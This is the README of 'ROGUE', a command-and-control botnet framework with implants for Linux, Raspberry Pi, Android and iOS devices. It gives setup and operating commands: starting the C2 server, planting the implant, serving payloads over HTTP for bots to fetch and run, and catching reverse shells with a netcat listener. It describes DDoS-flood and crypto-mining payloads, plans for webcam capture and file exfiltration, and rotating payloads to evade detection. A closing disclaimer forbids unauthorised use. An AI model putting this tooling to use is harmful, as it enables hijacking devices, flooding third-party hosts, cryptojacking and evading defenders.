# r0gue

ROGUE is a private, manually-deployed peer-to-peer and command-and-control (C2) botnet framework built for secure multi-device orchestration. It supports encrypted communication using AES, with optional peer-to-peer fallback if the primary C2 is unreachable. 
ROGUE supports implants on Linux laptops, Raspberry Pi, Termux (Android), iOS environments.

## Installation

ROGUE is a private repository. To clone it via SSH, first ensure your SSH key is registered with your GitHub account. Then from your Kali system, run:

```bash
git clone git@github.com:your-username/ROGUE.git
cd ROGUE
```

## install dependencies manually:

```bash
sudo apt update
sudo apt install python3 python3-pip
pip3 install pycryptodome
```

## File Structure

- `rogue_c2.py` – Encrypted command-and-control server
- `rogue_implant.py` – Bot implant for manual deployment
- `payloads/` – Folder containing optional executable payload modules (e.g. `ddos.py`, `mine.py`)

## Usage

To start the command-and-control server on Kali:

```bash
python3 rogue_c2.py
```

To convert a device into a bot, copy `rogue_implant.py` to the target device, edit the `C2_HOST` variable in the script to point to your C2’s IP address, and run:

```bash
python3 rogue_implant.py
```

The bot will persistently attempt to reconnect. If the C2 becomes unreachable, it will use peer-to-peer logic to scan for other known ROGUE bots on the network.

To serve payloads to bots, navigate into the `payloads/` folder on the C2 system and run:

```bash
python3 -m http.server 8000
```

## Sending Commands

Once bots are connected to the C2, you may issue commands using the terminal interface. Example commands include:

```text
load_payload mine.py        # Instruct bot to fetch payload from your hosted server
run_payload mine.py         # Execute fetched payload
reverse_shell               # Open reverse shell (C2 must be listening on port 9001)
```

To listen for a reverse shell from a bot:

```bash
nc -lvnp 9001
```

## Maintaining Bots

Rogue bots must have stable access to Python3 and network connectivity. You are responsible for copying the implant to each device. To maintain operational control:
- Keep your C2 running and listening for new connections
- Keep the payload server online (e.g. using Python's built-in HTTP server)
- Periodically rotate or update payload scripts to improve functionality or evade detection

## Payload Examples

- `mine.py`: Simulates lightweight CPU-based cryptocurrency mining by continuously hashing
- `ddos.py`: Launches a multi-threaded HTTP flood attack on a given IP/port 
- Future payloads may include webcam capture, file exfiltration, etc...

## Disclaimer

Do not deploy ROGUE on any device, network, or system that you do not own or have explicit permission to operate on. Misuse of this tool may violate local, state, or federal laws. The developers assume no liability and provide this software without warranty or support.


